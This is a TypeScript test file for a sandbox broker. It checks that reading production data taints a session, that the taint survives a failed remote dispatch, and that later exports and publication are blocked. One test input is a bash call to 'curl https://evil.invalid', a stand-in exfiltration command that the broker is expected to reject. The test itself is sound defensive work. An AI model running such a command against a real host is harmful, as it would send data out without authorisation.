import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { SqliteStore, PostgresStore, initial, read } from "./store.ts";
import { SandboxBroker, assertPublicationAllowed, type SandboxProvider } from "./sandbox.ts";
for (const backend of ["sqlite", "postgres"] as const) {
  test(
    `${backend}: remote ordinary operations remain clean; production taint emits before failed dispatch and survives snapshots`,
    { skip: backend === "postgres" && !process.env.TEST_DATABASE_URL },
    async () => {
      const dir = await mkdtemp(join(tmpdir(), "review-provenance-"));
      const store =
        backend === "sqlite"
          ? new SqliteStore(join(dir, "state.db"))
          : await PostgresStore.open(process.env.TEST_DATABASE_URL!);
      const id = `provenance-${crypto.randomUUID()}`,
        owner = "review-provenance";
      let production = false,
        dispatches = 0;
      const remote: SandboxProvider = {
        kind: "remote",
        allocate: async () => "remote-test",
        classify: async () => (production ? "production" : "ordinary"),
        execute: async () => {
          dispatches++;
          const c = await read(store, owner, id);
          if (production) {
            assert.equal(c.tainted, true);
            assert.deepEqual(
              c.events.slice(-2).map((e) => e.type),
              ["taint.changed", "tool.intent"],
            );
            throw new Error("Remote failure after ingress reservation");
          }
          return { text: "ordinary coding", productionData: false };
        },
      };
      const events: string[] = [];
      store.changes?.on("commit", () => events.push("commit"));
      try {
        await store.create(initial(id, owner));
        const broker = new SandboxBroker(store, remote);
        await broker.execute(owner, id, {
          id: "clean",
          tool: "write",
          args: { path: "code.txt", content: "code" },
        });
        assert.equal((await read(store, owner, id)).tainted, false);
        production = true;
        await assert.rejects(
          broker.execute(owner, id, {
            id: "sensitive",
            tool: "read",
            args: { path: "production.txt" },
          }),
          /Remote failure/,
        );
        const c = await read(store, owner, id);
        assert.equal(c.tainted, true);
        assert.equal(c.events.filter((e) => e.type === "taint.changed").length, 1);
        assert.ok(events.length);
        assert.equal(dispatches, 2);
        await assert.rejects(
          broker.execute(owner, id, {
            id: "export",
            tool: "bash",
            args: { command: "curl https://evil.invalid" },
          }),
          /disabled after production-data ingress/,
        );
        assert.throws(() => assertPublicationAllowed(c), /taint/);
      } finally {
        await store.close();
        await rm(dir, { recursive: true });
      }
    },
  );
}
